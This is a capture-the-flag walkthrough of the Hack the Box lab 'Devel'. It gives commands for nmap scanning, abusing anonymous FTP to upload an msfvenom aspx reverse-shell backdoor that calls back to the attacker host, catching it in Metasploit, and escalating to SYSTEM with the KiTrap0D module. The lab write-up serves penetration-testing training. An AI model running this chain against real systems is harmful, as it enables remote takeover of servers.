@@ -1,0 +1,311 @@
+
+								
+																		Hack the Box Challenge: Devel Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on April 3, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends!! Today we are going to solve another CTF challenge “Devel” which is categories as retired lab presented by Hack the Box for making online penetration practices. Challenges in this lab are very easy to complete even for beginners. 
+Level: Beginners
+Task: find user.txt and root.txt file on the victim’s machine.
+Since these labs are online accessible therefore they have static IP. The IP of Devel is 10.10.10. 5 so let’s initiate with nmap port enumeration.
+
+		
+		
+			
+			
+			
+			
+nmap -A 10.10.10.5
+			
+				
+					
+				
+					1
+				
+						nmap -A 10.10.10.5
+					
+				
+			
+		
+
+From given below image, you can observe we found port 21 and 80 are open and anonymous FTP login is allowed in victim’s network, therefore let’s go with FTP login.
+
+By using Anonymous: anonymous login credential you will get successfully access of FTP server via port 21 as shown below.
+
+From given below image you can perceive we have access to the remote machine. From here I can upload or download any file therefore now my next strategy will be to upload a backdoor file to victim’s machine.
+
+Without wasting time we had generated aspx backdoor using msfvenom with help of the following command and start multi handler in Metasploit framework.
+
+		
+		
+			
+			
+			
+			
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.6 lport=4444 -f aspx &gt; shell.aspx
+			
+				
+					
+				
+					1
+				
+						msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.6 lport=4444 -f aspx &gt; shell.aspx
+					
+				
+			
+		
+
+
+Then transfer your shell.aspx file into victims’ system using Filezilla.
+
+Now time to execute our shell through a web browser as shown below in the image.
+
+		
+		
+			
+			
+			
+			
+http://10.10.10.5/shell.aspx
+			
+				
+					
+				
+					1
+				
+						http://10.10.10.5/shell.aspx
+					
+				
+			
+		
+
+
+After executing uploaded backdoor file come back to the Metasploit framework and wait for the meterpreter session.
+
+		
+		
+			
+			
+			
+			
+msf use exploit/multi/handler
+msf exploit(multi/handler) set payload windows/meterpreter/reverse_tcp
+msf exploit(multi/handler) set lhost 10.10.14.6
+msf exploit(multi/handler) set lport 4444
+msf exploit(multi/handler) exploit
+			
+				
+					
+				
+					12345
+				
+						msf use exploit/multi/handlermsf exploit(multi/handler) set payload windows/meterpreter/reverse_tcpmsf exploit(multi/handler) set lhost 10.10.14.6msf exploit(multi/handler) set lport 4444msf exploit(multi/handler) exploit
+					
+				
+			
+		
+
+From given below image you can observe meterpreter session1 opened for accessing victim tty shell.
+
+		
+		
+			
+			
+			
+			
+meterpreter&gt;sysinfo
+			
+				
+					
+				
+					1
+				
+						meterpreter&gt;sysinfo
+					
+				
+			
+		
+
+
+Then I run a post exploit “Multi Recon Local Exploit Suggester” that suggests local meterpreter exploits that can be used for the further exploit. The exploits are recommended founded on the architecture and platform that the user has a shell opened as well as the available exploits in meterpreter.
+
+		
+		
+			
+			
+			
+			
+use post/multi/recon/local_exploit_suggester
+msf post(multi/recon/local_exploit_suggester) &gt; set session 1
+msf post(multi/recon/local_exploit_suggester) &gt; exploit
+			
+				
+					
+				
+					123
+				
+						use post/multi/recon/local_exploit_suggestermsf post(multi/recon/local_exploit_suggester) &gt; set session 1msf post(multi/recon/local_exploit_suggester) &gt; exploit
+					
+				
+			
+		
+
+Wonderful!! Exploit Suggester truly proof itself by suggesting another exploit name to which target is vulnerable. So now we will go with the last option as highlighted in the image.
+
+
+		
+		
+			
+			
+			
+			
+use exploit/windows/local/ms10_015_kitrap0d
+msf exploit(ms10_015_kitrap0d) &gt;set lhost 10.10.14.6
+msf exploit(ms10_015_kitrap0d) &gt;set lport 4321
+msf exploit(ms10_015_kitrap0d) &gt;set session 2
+msf exploit(ms10_015_kitrap0d) &gt;exploit
+			
+				
+					
+				
+					12345
+				
+						use exploit/windows/local/ms10_015_kitrap0dmsf exploit(ms10_015_kitrap0d) &gt;set lhost 10.10.14.6msf exploit(ms10_015_kitrap0d) &gt;set lport 4321msf exploit(ms10_015_kitrap0d) &gt;set session 2msf exploit(ms10_015_kitrap0d) &gt;exploit
+					
+				
+			
+		
+
+The above-exploited module will create a new session with SYSTEM privileges via the KiTrap0D exploit.
+Nice!! It works and we got new meterpreter session as system user and you can check in below image.
+
+		
+		
+			
+			
+			
+			
+meterpreter &gt; getuid
+			
+				
+					
+				
+					1
+				
+						meterpreter &gt; getuid
+					
+				
+			
+		
+
+As we have tty shell that has system privileges now let’s complete this task my searching user.txt and root.txt flag which is hidden somewhere inside a directory.
+
+
+		
+		
+			
+			
+			
+			
+meterpreter &gt; ls
+			
+				
+					
+				
+					1
+				
+						meterpreter &gt; ls
+					
+				
+			
+		
+
+We have successfully grabbed the user.txt file from C:\Users\babis\Desktop and similarly we found root.txt from C:\Users\Administrator \Desktop.
+Wonderful!! We had completed the task and hacked this box.
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
